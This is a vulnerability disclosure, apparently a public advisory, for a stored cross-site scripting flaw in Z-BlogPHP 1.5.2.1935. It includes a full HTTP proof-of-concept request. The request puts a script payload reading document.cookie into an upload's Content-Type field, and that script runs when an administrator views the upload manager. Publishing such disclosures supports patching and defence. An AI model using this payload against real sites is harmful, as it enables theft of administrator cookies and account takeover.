# Z-BlogPHP 1.5.2.1935 (Zero) Stored XSS via zb_system/function/c_system_admin.php  in 1237 line.
## Component
Z-BlogPHP 1.5.2.1935 (Zero) Download link:https://www.zblogcn.com/zblogphp

## Vulnerability location
zb_system/function/c_system_admin.php  in 1237 line.
![]()

## Vulnerability trigger condition
login with a author's privilege account
## POC 
edit Content-Type param value:<script>alert(document.cookie)</script>,then forward it.
```
POST /Z-Blog/zb_system/cmd.php?act=UploadPst&csrfToken=5fb877f1b3051a92b4c2f6809354caa5 HTTP/1.1
Host: 192.168.3.216
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.3.216/Z-Blog/zb_system/admin/index.php?act=UploadMng
Content-Type: multipart/form-data; boundary=---------------------------61109570014186299461550053428
Content-Length: 19160
Cookie: timezone=8; username=safetest; token=c8ab6b10998316d1390318ab2bc5b95b90c63c9c62d22fcfe2b6d379340e21911539683657; addinfoZ-Blog=%7B%22chkadmin%22%3A1%2C%22chkarticle%22%3A1%2C%22levelname%22%3A%22%5Cu4f5c%5Cu8005%22%2C%22userid%22%3A%223%22%2C%22useralias%22%3A%22safetest%22%7D; timezone=8
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------61109570014186299461550053428
Content-Disposition: form-data; name="file"; filename="天气预报.png"
Content-Type: <script>alert(document.cookie)</script>

�PNG


IHDRvx'�asRGB���gAMA���a	pHYs���o�dIIDATx^�w�$e�����y=���� Q@I�A���$E0�""�����9�s�avvvvfv'��<ӓs�f��]�SU=�=��
���xY�U�=�u��~w��g��nz�m�:��������s�{���E�H<����tR���s������P?��!�;:����c��w���>���[�W��D��S1��k�k�cjDN(��U"�m��8Z)rD�2�C�!9���Ð�7�E�W)�=e�v�Z�t�C)��l+��E��(h��bSaP6lt=(`�R`��u�6?`X�g����U�ì�Y��X,�e6K��Y��E���+r[�����/ۧ����)h?W^�ݹ�v�X��i�S�n�l�ٖe��d�6{,6�ؘ��"\�O�XkaMZ��k�lX��Z�t�"�byr�,Kn��.�$
�����³6g,�i��0�f��h1GIh��.f)�3mf�LSN[LU�dJ\�L>U/-��Ih��V����x�?�;�uΞ���݈S��"CB�)t;�v�.U�#V�n�� �b�k�	y�#��T�:*k����j[��\��U�K#�#K	I�E.Mj4��2!r1��"O�.@�|�gc	m02�fq�T#y3a��#ՈE�d*S��$�^�bj�,Ln���+��]���VB-���Hu�鰕t*[�"mT���ȴ0"]8�tP�N:T�#t8��G��t�B��Se��K�:�XGh�Pe�-ԑ�����ZL�����I�
��j��������)
	E�r.�F*ݜKh�T�1R]B�T�)�L'�n�aR�h�4M��PK�[���%t4�HS�ڌ��s�6%�����!v2"'�u�	6�b�����lE�mWN{�	
�j�<�Pgu	E�J�Kf(��P��"�\RϙR[�Jo��s�5�,C��6���U�n���ROZ�]+�穀붖��U}�ێ���;�Z��a��&L"򶁊4��6����fÆ�SN�E�aF&�V���,W�4�D:��`D�m��f��"d-��eH �,�
�d�.��-9L��#�9.�|�}=�&��ܩ��d
-----------------------------61109570014186299461550053428
Content-Disposition: form-data; name="auto_rename"

on
-----------------------------61109570014186299461550053428--

```
when we login with administrator,access to link,http://192.168.3.216/Z-Blog/zb_system/admin/index.php?act=UploadMng,the Js code successfully executed.
Attackers can exploit this vulnerability to obtain import information such as administrator cookies.
![]()
